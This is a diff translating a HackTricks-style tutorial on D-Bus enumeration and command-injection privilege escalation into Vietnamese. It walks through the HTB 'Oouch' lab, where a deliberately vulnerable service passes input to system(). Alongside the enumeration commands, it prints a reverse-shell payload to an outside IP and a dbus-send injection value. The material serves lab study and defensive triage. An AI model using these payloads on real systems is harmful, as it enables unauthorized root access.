@@ -1,20 +1,20 @@
-# D-Bus Enumeration & Command Injection Privilege Escalation
+# D-Bus Enumeration & Command Injection leo thang đặc quyền
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## **GUI enumeration**
+## **Liệt kê GUI**
 
-D-Bus is utilized as the inter-process communications (IPC) mediator in Ubuntu desktop environments. On Ubuntu, the concurrent operation of several message buses is observed: the system bus, primarily utilized by **privileged services to expose services relevant across the system**, and a session bus for each logged-in user, exposing services relevant only to that specific user. The focus here is primarily on the system bus due to its association with services running at higher privileges (e.g., root) as our objective is to elevate privileges. It is noted that D-Bus's architecture employs a 'router' per session bus, which is responsible for redirecting client messages to the appropriate services based on the address specified by the clients for the service they wish to communicate with.<sup>[[1]](#references)</sup>
+D-Bus được sử dụng làm trung gian giao tiếp liên tiến trình (IPC) trong các môi trường desktop Ubuntu. Trên Ubuntu, có thể thấy nhiều message bus hoạt động đồng thời: system bus, chủ yếu được **các dịch vụ có đặc quyền sử dụng để cung cấp các dịch vụ liên quan đến toàn hệ thống**, và session bus cho mỗi người dùng đã đăng nhập, cung cấp các dịch vụ chỉ liên quan đến người dùng cụ thể đó. Ở đây, trọng tâm chủ yếu là system bus do nó liên quan đến các dịch vụ chạy với đặc quyền cao hơn (ví dụ: root), vì mục tiêu của chúng ta là leo thang đặc quyền. Kiến trúc của D-Bus sử dụng một “router” cho mỗi session bus, chịu trách nhiệm chuyển hướng thông điệp của client đến các dịch vụ phù hợp, dựa trên địa chỉ mà client chỉ định cho dịch vụ họ muốn giao tiếp.<sup>[[1]](#references)</sup>
 
-Services on D-Bus are defined by the **objects** and **interfaces** they expose. Objects can be likened to class instances in standard OOP languages, with each instance uniquely identified by an **object path**. This path, akin to a filesystem path, uniquely identifies each object exposed by the service. A key interface for research purposes is the **org.freedesktop.DBus.Introspectable** interface, featuring a singular method, Introspect. This method returns an XML representation of the object's supported methods, signals, and properties, with a focus here on methods while omitting properties and signals.
+Các dịch vụ trên D-Bus được định nghĩa bởi các **object** và **interface** mà chúng cung cấp. Có thể xem object như các thể hiện lớp trong các ngôn ngữ OOP thông thường; mỗi thể hiện được xác định duy nhất bằng một **object path**. Path này, tương tự như path của filesystem, xác định duy nhất từng object do dịch vụ cung cấp. Một interface quan trọng phục vụ mục đích nghiên cứu là **org.freedesktop.DBus.Introspectable**, có một phương thức duy nhất là Introspect. Phương thức này trả về biểu diễn XML các phương thức, tín hiệu và thuộc tính mà object hỗ trợ; ở đây tập trung vào các phương thức, đồng thời bỏ qua thuộc tính và tín hiệu.
 
-For communication with the D-Bus interface, two tools were employed: a CLI tool named **gdbus** for easy invocation of methods exposed by D-Bus in scripts, and [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), a Python-based GUI tool designed to enumerate the services available on each bus and to display the objects contained within each service.
+Để giao tiếp với interface D-Bus, có hai công cụ được sử dụng: công cụ CLI có tên **gdbus**, giúp dễ dàng gọi các phương thức do D-Bus cung cấp trong các script, và [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), công cụ GUI dựa trên Python được thiết kế để liệt kê các dịch vụ có trên mỗi bus và hiển thị các object thuộc từng dịch vụ.
 
 ```bash
 sudo apt-get install d-feet
 ```
 
-If you are checking the **session bus**, confirm the current address first:
+Nếu bạn đang kiểm tra **session bus**, hãy xác nhận địa chỉ hiện tại trước:
 
 ```bash
 echo "$DBUS_SESSION_BUS_ADDRESS"
@@ -24,21 +24,21 @@ echo "$DBUS_SESSION_BUS_ADDRESS"
 
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
-In the first image services registered with the D-Bus system bus are shown, with **org.debin.apt** specifically highlighted after selecting the System Bus button. D-Feet queries this service for objects, displaying interfaces, methods, properties, and signals for chosen objects, seen in the second image. Each method's signature is also detailed.
+Trong hình đầu tiên, các service được đăng ký với D-Bus system bus được hiển thị, trong đó **org.debin.apt** được tô sáng sau khi chọn nút System Bus. D-Feet truy vấn service này để lấy các object, rồi hiển thị interface, method, property và signal của những object được chọn, như trong hình thứ hai. Signature của từng method cũng được mô tả chi tiết.
 
-A notable feature is the display of the service's **process ID (pid)** and **command line**, useful for confirming if the service runs with elevated privileges, important for research relevance.
+Một tính năng đáng chú ý là hiển thị **process ID (pid)** và **command line** của service, hữu ích để xác nhận service có chạy với đặc quyền nâng cao hay không — điều quan trọng đối với mức độ liên quan của nghiên cứu.
 
-**D-Feet also allows method invocation**: users can input Python expressions as parameters, which D-Feet converts to D-Bus types before passing to the service.
+**D-Feet cũng cho phép gọi method**: người dùng có thể nhập biểu thức Python làm tham số; D-Feet sẽ chuyển đổi chúng thành kiểu D-Bus trước khi gửi đến service.
 
-However, note that **some methods require authentication** before allowing us to invoke them. We will ignore these methods, since our goal is to elevate our privileges without credentials in the first place.
+Tuy nhiên, lưu ý rằng **một số method yêu cầu xác thực** trước khi cho phép chúng ta gọi. Chúng ta sẽ bỏ qua các method này, vì ngay từ đầu mục tiêu của chúng ta là nâng cao đặc quyền mà không cần thông tin xác thực.
 
-Also note that some of the services query another D-Bus service named org.freedeskto.PolicyKit1 whether a user should be allowed to perform certain actions or not.
+Cũng lưu ý rằng một số service truy vấn một D-Bus service khác có tên org.freedeskto.PolicyKit1 để xác định người dùng có được phép thực hiện một số hành động nhất định hay không.
 
-## **Cmd line Enumeration**
+## **Liệt kê qua dòng lệnh**
 
-### List Service Objects
+### Liệt kê các Object của Service
 
-It's possible to list opened D-Bus interfaces with:
+Có thể liệt kê các interface D-Bus đang được mở bằng:
 
 ```bash
 busctl list #List D-Bus interfaces
@@ -64,24 +64,24 @@ org.freedesktop.hostname1                - -               -                (act
 org.freedesktop.locale1                  - -               -                (activatable) -                         -
 ```
 
-Services marked as **`(activatable)`** are especially interesting because they are **not running yet**, but a bus request can start them on demand. Do not stop at `busctl list`; map those names to the actual binaries they would execute.
+Các service được đánh dấu **`(activatable)`** đặc biệt đáng chú ý vì chúng **chưa chạy**, nhưng một yêu cầu trên bus có thể khởi động chúng theo yêu cầu. Đừng chỉ dừng ở `busctl list`; hãy xác định các tên đó tương ứng với những binary thực tế nào sẽ được thực thi.
 
 ```bash
 ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
 grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
 ```
 
-That quickly tells you which `Exec=` path will start for an activatable name and under which identity. If the binary or its execution chain is weakly protected, an inactive service can still become a privilege-escalation path.
+Điều đó nhanh chóng cho bạn biết đường dẫn `Exec=` nào sẽ được chạy cho một tên có thể kích hoạt và dưới danh tính nào. Nếu binary hoặc chuỗi thực thi của nó được bảo vệ yếu, một service không hoạt động vẫn có thể trở thành con đường privilege-escalation.
 
-For a privileged USB-imaging service, correlate its system-bus name with the **effective** policy for its image-writing action. A legacy vendor rule may give an administrative Unix group `ResultActive=yes` without a password prompt; confirm that the current account belongs to that group, the session is active, the rule is actually loaded and not overridden, and the installed helper still accepts caller-selected source and destination paths. The service descriptor or an old package version alone does not prove arbitrary file access. A missing activation descriptor also does not rule out an already-running service. Inspect fixed policy and service files without invoking the image-writing method; see the [original service analysis](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/).
+Đối với một service ghi ảnh USB có đặc quyền, hãy đối chiếu tên system-bus của nó với chính sách **effective** cho hành động ghi ảnh. Một quy tắc vendor cũ có thể cấp `ResultActive=yes` cho một nhóm Unix quản trị mà không yêu cầu nhập mật khẩu; hãy xác nhận tài khoản hiện tại thuộc nhóm đó, phiên đang active, quy tắc thực sự được tải và không bị ghi đè, đồng thời helper đã cài đặt vẫn chấp nhận đường dẫn nguồn và đích do caller chọn. Chỉ riêng service descriptor hoặc phiên bản package cũ không chứng minh được khả năng truy cập tùy ý các file. Thiếu activation descriptor cũng không loại trừ khả năng service đang chạy. Kiểm tra các file chính sách và service cố định mà không gọi phương thức ghi ảnh; xem [phân tích service gốc](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/).
 
-#### Connections
+#### Các kết nối
 
-[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) When a process sets up a connection to a bus, the bus assigns to the connection a special bus name called _unique connection name_. Bus names of this type are immutable—it's guaranteed they won't change as long as the connection exists—and, more importantly, they can't be reused during the bus lifetime. This means that no other connection to that bus will ever have assigned such unique connection name, even if the same process closes down the connection to the bus and creates a new one. Unique connection names are easily recognizable because they start with the—otherwise forbidden—colon character.<sup>[[4]](#references)</sup>
+[Theo Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Khi một process thiết lập kết nối với một bus, bus cấp cho kết nối một tên bus đặc biệt gọi là _tên kết nối duy nhất_. Tên bus thuộc loại này là bất biến—đảm bảo chúng không thay đổi chừng nào kết nối còn tồn tại—và quan trọng hơn, không thể được sử dụng lại trong suốt vòng đời của bus. Điều này có nghĩa là không kết nối nào khác với bus đó có thể được gán tên kết nối duy nhất như vậy, ngay cả khi cùng một process đóng kết nối với bus rồi tạo một kết nối mới. Tên kết nối duy nhất rất dễ nhận biết vì chúng bắt đầu bằng ký tự hai chấm—vốn bị cấm trong các trường hợp khác.<sup>[[4]](#references)</sup>
 
-### Service Object Info
+### Thông tin đối tượng service
 
-Then, you can obtain some information about the interface with:
+Sau đó, bạn có thể lấy một số thông tin về interface bằng lệnh:
 
 ```bash
 busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface
@@ -143,7 +143,7 @@ BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
         cap_wake_alarm cap_block_suspend cap_audit_read
 ```
 
-Also correlate the bus name with its `systemd` unit and executable path:
+Ngoài ra, hãy đối chiếu tên bus với unit `systemd` và đường dẫn của tệp thực thi:
 
 ```bash
 systemctl status dbus-server.service --no-pager
@@ -151,11 +151,11 @@ systemctl cat dbus-server.service
 namei -l /root/dbus-server
 ```
 
-This answers the operational question that matters during privesc: **if a method call succeeds, which real binary and unit will perform the action?**
+Điều này trả lời câu hỏi thực tế quan trọng trong quá trình privesc: **nếu một method call thành công, binary và unit thực tế nào sẽ thực hiện hành động đó?**
 
-### List Interfaces of a Service Object
+### Liệt kê các Interface của một Service Object
 
-You need to have enough permissions.
+Bạn cần có đủ quyền.
 
 ```bash
 busctl tree htb.oouch.Block #Get Interfaces of the service object
@@ -165,9 +165,9 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
     └─/htb/oouch/Block
 ```
 
-### Introspect Interface of a Service Object
+### Khảo sát Interface của một Service Object
 
-Note how in this example it was selected the latest interface discovered using the `tree` parameter (_see previous section_):
+Lưu ý rằng trong ví dụ này, interface mới nhất được phát hiện đã được chọn bằng tham số `tree` (_xem phần trước_):
 
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
@@ -187,24 +187,24 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
 
-Note the method `.Block` of the interface `htb.oouch.Block` (the one we are interested in). The "s" of the other columns may mean that it's expecting a string.
+Lưu ý method `.Block` của interface `htb.oouch.Block` (method mà chúng ta quan tâm). Chữ "s" ở các cột khác có thể cho biết nó đang chờ một chuỗi.
 
-Before trying anything dangerous, validate a **read-oriented** or otherwise low-risk method first. This separates three cases cleanly: wrong syntax, reachable but denied, or reachable and allowed.
+Trước khi thử bất kỳ thứ gì nguy hiểm, hãy xác thực một method **chỉ đọc** hoặc có rủi ro thấp trước. Việc này giúp phân biệt rõ ba trường hợp: sai cú pháp, có thể truy cập nhưng bị từ chối, hoặc có thể truy cập và được phép.
 
 ```bash
 busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
 gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
 ```
 
-### Correlate D-Bus Methods with Policies and Actions
+### Đối chiếu các phương thức D-Bus với policy và action
 
-Introspection tells you **what** you can call, but it does not tell you **why** a call is allowed or denied. For real privesc triage you usually need to inspect **three layers together**:
+Introspection cho bạn biết **có thể** gọi những gì, nhưng không cho biết **vì sao** một lệnh gọi được phép hoặc bị từ chối. Để triage privesc thực tế, bạn thường cần kiểm tra đồng thời **ba lớp**:
 
-1. **Activation metadata** (`.service` files or `SystemdService=`) to learn which binary and unit will actually run.
-2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) to learn who may `own`, `send_destination`, or `receive_sender`.
-3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) to learn the default authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).
+1. **Metadata kích hoạt** (`.service` files hoặc `SystemdService=`) để biết binary và unit nào sẽ thực sự chạy.
+2. **Policy XML của D-Bus** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) để biết ai có thể `own`, `send_destination` hoặc `receive_sender`.
+3. **Các file action của Polkit** (`/usr/share/polkit-1/actions/*.policy`) để biết mô hình ủy quyền mặc định (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).
 
-Useful commands:
+Các lệnh hữu ích:
 
 ```bash
 grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
@@ -213,24 +213,24 @@ grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.p
 pkaction --verbose
 ```
 
-Do **not** assume a 1:1 mapping between a D-Bus method and a Polkit action. The same method may choose a different action depending on the object being modified or on runtime context. Therefore the practical workflow is:
+Do **not** giả định có ánh xạ 1:1 giữa một method D-Bus và một action Polkit. Cùng một method có thể chọn action khác nhau tùy thuộc vào object đang được chỉnh sửa hoặc ngữ cảnh runtime. Vì vậy, quy trình thực tế là:
 
 1. `busctl introspect` / `gdbus introspect`
-2. `pkaction --verbose` and grep the relevant `.policy` files
-3. low-risk live probes with `busctl call`, `gdbus call`, or `dbusmap --enable-probes --null-agent`
+2. `pkaction --verbose` và grep các file `.policy` liên quan
+3. Thăm dò trực tiếp với rủi ro thấp bằng `busctl call`, `gdbus call` hoặc `dbusmap --enable-probes --null-agent`
 
-Proxy or compatibility services deserve extra attention. A **root-running proxy** that forwards requests to another D-Bus service over its own pre-established connection can accidentally make the backend treat every request as coming from UID 0 unless the original caller identity is re-validated.<sup>[[3]](#references)</sup>
+Các dịch vụ proxy hoặc tương thích cần được chú ý thêm. Một **proxy chạy dưới quyền root** chuyển tiếp các request đến một dịch vụ D-Bus khác qua kết nối đã được thiết lập sẵn của chính nó có thể vô tình khiến backend xem mọi request như đến từ UID 0, trừ khi danh tính của caller ban đầu được xác thực lại.<sup>[[3]](#references)</sup>
 
-### Monitor/Capture Interface
+### Giao diện Monitor/Capture
 
-With enough privileges (just `send_destination` and `receive_sender` privileges aren't enough) you can **monitor a D-Bus communication**.
+Với đủ quyền (chỉ có quyền `send_destination` và `receive_sender` là chưa đủ), bạn có thể **monitor giao tiếp D-Bus**.
 
-In order to **monitor** a **communication** you will need to be **root.** If you still find problems being root check [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) and [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
+Để **monitor** một **giao tiếp**, bạn cần là **root**. Nếu vẫn gặp vấn đề khi chạy dưới quyền root, hãy xem [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) và [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
 > [!WARNING]
-> If you know how to configure a D-Bus config file to **allow non root users to sniff** the communication please **contact me**!
+> Nếu bạn biết cách cấu hình file D-Bus để **cho phép người dùng không phải root sniff** giao tiếp này, vui lòng **liên hệ với tôi**!
 
-Different ways to monitor:
+Các cách monitor khác nhau:
 
 ```bash
 sudo busctl monitor htb.oouch.Block #Monitor only specified
@@ -238,7 +238,7 @@ sudo busctl monitor #System level, even if this works you will only see messages
 sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
 ```
 
-In the following example the interface `htb.oouch.Block` is monitored and **the message "**_**lalalalal**_**" is sent through miscommunication**:
+Trong ví dụ sau, interface `htb.oouch.Block` được giám sát và **thông điệp "**_**lalalalal**_**" được gửi do nhầm lẫn trong giao tiếp**:
 
 ```bash
 busctl monitor htb.oouch.Block
@@ -259,22 +259,22 @@ Monitoring bus message stream.
   };
 ```
 
-You can use `capture` instead of `monitor` to save the results in a **pcapng** file that Wireshark can open:
+Bạn có thể dùng `capture` thay cho `monitor` để lưu kết quả vào tệp **pcapng** mà Wireshark có thể mở:
 
 ```bash
 sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
 sudo busctl capture > system-bus.pcapng
 ```
 
-#### Filtering all the noise <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
+#### Lọc bỏ toàn bộ thông tin nhiễu <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
-If there is just too much information on the bus, pass a match rule like so:
+Nếu có quá nhiều thông tin trên bus, hãy truyền một quy tắc khớp như sau:
 
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
 
-Multiple rules can be specified. If a message matches _any_ of the rules, the message will be printed. Like so:
+Có thể chỉ định nhiều quy tắc. Nếu một thông điệp khớp với _bất kỳ_ quy tắc nào, thông điệp đó sẽ được in ra. Ví dụ:
 
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
@@ -284,15 +284,15 @@ dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 dbus-monitor "type=method_call" "type=method_return" "type=error"
 ```
 
-See the [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) for more information on match rule syntax.<sup>[[7]](#references)</sup>
+Xem [tài liệu D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) để biết thêm thông tin về cú pháp quy tắc khớp.<sup>[[7]](#references)</sup>
 
-### More
+### Thêm
 
-`busctl` has even more options, [**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html).
+`busctl` còn có nhiều tùy chọn khác, [**xem tất cả tại đây**](https://www.freedesktop.org/software/systemd/man/busctl.html).
 
-## **Vulnerable Scenario**
+## **Kịch bản dễ bị tấn công**
 
-As user **qtc inside the host "oouch" from HTB** you can find an **unexpected D-Bus config file** located in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
+Với tư cách người dùng **qtc trên host "oouch" thuộc HTB**, bạn có thể tìm thấy một **file cấu hình D-Bus bất thường** tại _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
@@ -315,9 +315,9 @@ As user **qtc inside the host "oouch" from HTB** you can find an **unexpected D-
 </busconfig>
 ```
 
-Note from the previous configuration that **you will need to be the user `root` or `www-data` to send and receive information** via this D-BUS communication.
+Lưu ý từ cấu hình trước đó rằng **bạn cần là người dùng `root` hoặc `www-data` để gửi và nhận thông tin** qua giao tiếp D-BUS này.
 
-As user **qtc** inside the docker container **aeb4525789d8** you can find some dbus related code in the file _/code/oouch/routes.py._ This is the interesting code:
+Với tư cách người dùng **qtc** bên trong container docker **aeb4525789d8**, bạn có thể tìm thấy một số đoạn mã liên quan đến dbus trong tệp _/code/oouch/routes.py._ Đây là đoạn mã đáng chú ý:
 
 ```python
 if primitive_xss.search(form.textfield.data):
@@ -331,14 +331,14 @@ if primitive_xss.search(form.textfield.data):
         return render_template('hacker.html', title='Hacker')
 ```
 
-As you can see, it is **connecting to a D-Bus interface** and sending to the **"Block" function** the "client_ip".
+Như bạn có thể thấy, nó **đang kết nối đến một D-Bus interface** và gửi "client_ip" đến **hàm "Block"**.
 
-In the other side of the D-Bus connection there is some C compiled binary running. This code is **listening** in the D-Bus connection **for IP address and is calling iptables via `system` function** to block the given IP address.\
-**The call to `system` is vulnerable on purpose to command injection**, so a payload like the following one will create a reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+Ở đầu bên kia của kết nối D-Bus có một binary C đã biên dịch đang chạy. Đoạn code này **đang lắng nghe** kết nối D-Bus **để nhận địa chỉ IP và gọi iptables thông qua hàm `system`** nhằm chặn địa chỉ IP được gửi đến.\
+**Lệnh gọi `system` cố ý có lỗ hổng command injection**, vì vậy payload như sau sẽ tạo reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
 ### Exploit it
 
-At the end of this page you can find the **complete C code of the D-Bus application**. Inside of it you can find between the lines 91-97 **how the `D-Bus object path`** **and `interface name`** are **registered**. This information will be necessary to send information to the D-Bus connection:
+Ở cuối trang này, bạn có thể tìm thấy **toàn bộ mã C của ứng dụng D-Bus**. Trong đó, bạn có thể xem ở các dòng 91-97 **cách `D-Bus object path`** **và `interface name`** được **đăng ký**. Thông tin này sẽ cần thiết để gửi dữ liệu đến kết nối D-Bus:
 
 ```c
         /* Install the object */
@@ -350,7 +350,7 @@ At the end of this page you can find the **complete C code of the D-Bus applicat
                                      NULL);
 ```
 
-Also, in line 57 you can find that **the only method registered** for this D-Bus communication is called `Block`(_**Thats why in the following section the payloads are going to be sent to the service object `htb.oouch.Block`, the interface `/htb/oouch/Block` and the method name `Block`**_):
+Ngoài ra, ở dòng 57, bạn có thể thấy rằng **phương thức duy nhất được đăng ký** cho giao tiếp D-Bus này có tên là `Block`(_**Đó là lý do payload trong phần tiếp theo sẽ được gửi đến service object `htb.oouch.Block`, interface `/htb/oouch/Block` và tên phương thức `Block`**_):
 
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
@@ -358,7 +358,7 @@ SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 
 #### Python
 
-The following python code will send the payload to the D-Bus connection to the `Block` method via `block_iface.Block(runme)` (_note that it was extracted from the previous chunk of code_):
+Đoạn mã Python sau sẽ gửi payload đến kết nối D-Bus để gọi phương thức `Block` thông qua `block_iface.Block(runme)` (_lưu ý rằng đoạn mã này được trích từ phần mã trước đó_):
 
 ```python
 import dbus
@@ -376,14 +376,14 @@ bus.close()
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
 
-- `dbus-send` is a tool used to send message to “Message Bus”
-- Message Bus – A software used by systems to make communications between applications easily. It’s related to Message Queue (messages are ordered in sequence) but in Message Bus the messages are sending in a subscription model and also very quick.
-- “-system” tag is used to mention that it is a system message, not a session message (by default).
-- “–print-reply” tag is used to print our message appropriately and receives any replies in a human-readable format.
-- “–dest=Dbus-Interface-Block” The address of the Dbus interface.
-- “–string:” – Type of message we like to send to the interface. There are several formats of sending messages like double, bytes, booleans, int, objpath. Out of this, the “object path” is useful when we want to send a path of a file to the Dbus interface. We can use a special file (FIFO) in this case to pass a command to interface in the name of a file. “string:;” – This is to call the object path again where we place of FIFO reverse shell file/command.
+- `dbus-send` là công cụ dùng để gửi thông điệp đến “Message Bus”
+- Message Bus – Phần mềm được hệ thống sử dụng để giúp các ứng dụng giao tiếp với nhau dễ dàng. Nó liên quan đến Message Queue (các thông điệp được sắp xếp theo thứ tự), nhưng trong Message Bus, các thông điệp được gửi theo mô hình đăng ký nhận và cũng rất nhanh.
+- Thẻ “-system” được dùng để chỉ định đây là thông điệp hệ thống, không phải thông điệp phiên (mặc định).
+- Thẻ “–print-reply” được dùng để in thông điệp của chúng ta đúng định dạng và nhận mọi phản hồi ở định dạng mà con người có thể đọc được.
+- “–dest=Dbus-Interface-Block” là địa chỉ của giao diện Dbus.
+- “–string:” – Loại thông điệp chúng ta muốn gửi đến giao diện. Có một số định dạng để gửi thông điệp như double, bytes, booleans, int, objpath. Trong số đó, “object path” hữu ích khi chúng ta muốn gửi đường dẫn tệp đến giao diện Dbus. Trong trường hợp này, chúng ta có thể dùng một tệp đặc biệt (FIFO) để truyền lệnh đến giao diện dưới dạng tên tệp. “string:;” – Dùng để gọi lại object path, nơi chúng ta đặt tệp/lệnh reverse shell FIFO.
 
-_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._
+_Lưu ý rằng trong `htb.oouch.Block.Block`, phần đầu (`htb.oouch.Block`) tham chiếu đến đối tượng dịch vụ, còn phần cuối (`.Block`) tham chiếu đến tên phương thức._
 
 ### C code
 
@@ -528,14 +528,14 @@ finish:
 }
 ```
 
-## Automated Enumeration Helpers (2023-2025)
+## Công cụ hỗ trợ Enumeration tự động (2023-2025)
 
-Enumeration of a large D-Bus attack surface manually with `busctl`/`gdbus` quickly becomes painful. Two small FOSS utilities released in the last few years can speed things up during red-team or CTF engagements:
+Enumeration thủ công một attack surface D-Bus lớn bằng `busctl`/`gdbus` nhanh chóng trở nên khó khăn. Hai tiện ích FOSS nhỏ được phát hành trong vài năm gần đây có thể giúp tăng tốc trong các đợt red-team hoặc CTF:
 
 ### dbusmap ("Nmap for D-Bus")
-* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
-* Written in C; single static binary (<50 kB) that walks every object path, pulls the `Introspect` XML and maps it to the owning PID/UID.<sup>[[5]](#references)</sup>
-* Useful flags:
+* Tác giả: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
+* Được viết bằng C; một binary tĩnh duy nhất (<50 kB) duyệt qua mọi object path, lấy XML `Introspect` và ánh xạ nó tới PID/UID sở hữu.<sup>[[5]](#references)</sup>
+* Các flag hữu ích:
   ```bash
   # List every service on the *system* bus and dump all callable methods
   sudo dbus-map --dump-methods
@@ -543,61 +543,60 @@ Enumeration of a large D-Bus attack surface manually with `busctl`/`gdbus` quick
   # Actively probe methods/properties you can reach without Polkit prompts
   sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
   ```
-* The tool marks unprotected well-known names with `!`, instantly revealing services you can *own* (take over) or method calls that are reachable from an unprivileged shell.
+* Công cụ đánh dấu các well-known name không được bảo vệ bằng `!`, giúp nhanh chóng phát hiện các service bạn có thể *own* (chiếm quyền) hoặc các method call có thể truy cập từ shell không có đặc quyền.
 
 ### uptux.py
-* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
-* Python-only script that looks for *writable* paths in systemd units **and** overly-permissive D-Bus policy files (e.g. `send_destination="*"`).<sup>[[6]](#references)</sup>
-* Quick usage:
+* Tác giả: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
+* Script chỉ dùng Python, tìm các đường dẫn *writable* trong systemd unit **và** các tệp policy D-Bus có quyền quá rộng (ví dụ: `send_destination="*"`).<sup>[[6]](#references)</sup>
+* Cách dùng nhanh:
   ```bash
   python3 uptux.py -n          # run all checks but don’t write a log file
   python3 uptux.py -d          # enable verbose debug output
   ```
-* The D-Bus module searches the directories below and highlights any service that can be spoofed or hijacked by a normal user:
-  * `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
-  * `/etc/dbus-1/system-local.d/` (vendor overrides)
+* Module D-Bus tìm kiếm các thư mục bên dưới và làm nổi bật mọi service có thể bị giả mạo hoặc chiếm quyền bởi người dùng thông thường:
+  * `/etc/dbus-1/system.d/` và `/usr/share/dbus-1/system.d/`
+  * `/etc/dbus-1/system-local.d/` (ghi đè từ nhà cung cấp)
 
 ---
 
-## Notable D-Bus Privilege-Escalation Bugs (2024-2025)
+## Các lỗi leo thang đặc quyền D-Bus đáng chú ý (2024-2025)
 
-Keeping an eye on recently published CVEs helps spotting similar insecure patterns in custom code. Two good recent examples are:<sup>[[2]](#references)[[3]](#references)</sup>
+Theo dõi các CVE mới được công bố giúp phát hiện những mẫu không an toàn tương tự trong mã tùy chỉnh. Hai ví dụ gần đây tiêu biểu là:<sup>[[2]](#references)[[3]](#references)</sup>
 
-| Year | CVE | Component | Root Cause | Offensive lesson |
-|------|-----|-----------|------------|------------------|
-| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | The root-running service exposed a D-Bus interface that unprivileged users could reconfigure, including loading attacker-controlled macro behavior. | If a daemon exposes **device/profile/config management** on the system bus, treat writable configuration and macro features as code-execution primitives, not just "settings". |
-| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | A root-running compatibility proxy forwarded requests to backend services without preserving the original caller's security context, so backends trusted the proxy as UID 0. | Treat **proxy / bridge / compatibility** D-Bus services as a separate bug class: if they relay privileged calls, verify how caller UID/Polkit context reaches the backend. |
+| Năm | CVE | Thành phần | Nguyên nhân gốc rễ | Bài học tấn công |
+|------|-----|-----------|------------------|------------------|
+| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Service chạy với quyền root để lộ một giao diện D-Bus mà người dùng không có đặc quyền có thể cấu hình lại, bao gồm cả việc tải hành vi macro do kẻ tấn công kiểm soát. | Nếu một daemon cung cấp **quản lý thiết bị/profile/cấu hình** trên system bus, hãy xem cấu hình có thể ghi và các tính năng macro là nguyên thủy thực thi mã, không chỉ là "cài đặt". |
